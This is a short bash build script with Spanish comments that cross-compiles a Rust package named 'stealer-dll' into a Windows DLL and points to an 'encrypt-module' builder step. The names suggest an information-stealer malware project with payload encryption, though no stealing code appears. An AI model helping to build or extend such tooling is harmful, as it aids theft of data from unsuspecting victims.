#!/bin/bash
# Script para compilar stealer-dll desde Linux/WSL

set -e

echo "🔧 Compilando stealer.dll para Windows..."
echo ""

# Verificar que mingw-w64 esté instalado
if ! command -v x86_64-w64-mingw32-gcc &> /dev/null; then
    echo "❌ Error: mingw-w64 no está instalado"
    echo ""
    echo "Instalar con:"
    echo "  sudo apt install mingw-w64"
    exit 1
fi

# Verificar que el target esté agregado
if ! rustup target list | grep -q "x86_64-pc-windows-gnu (installed)"; then
    echo "📦 Agregando target x86_64-pc-windows-gnu..."
    rustup target add x86_64-pc-windows-gnu
    echo ""
fi

# Compilar
echo "🔨 Compilando stealer-dll..."
cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll

# Verificar
DLL_PATH="target/x86_64-pc-windows-gnu/release/stealer.dll"
if [ -f "$DLL_PATH" ]; then
    SIZE=$(du -h "$DLL_PATH" | cut -f1)
    echo ""
    echo "✅ Compilación exitosa!"
    echo "📦 DLL generada: $DLL_PATH ($SIZE)"
    echo ""
    echo "Siguiente paso:"
    echo "  cd builder && cargo run -- encrypt-module"
else
    echo ""
    echo "❌ Error: No se generó stealer.dll"
    exit 1
fi
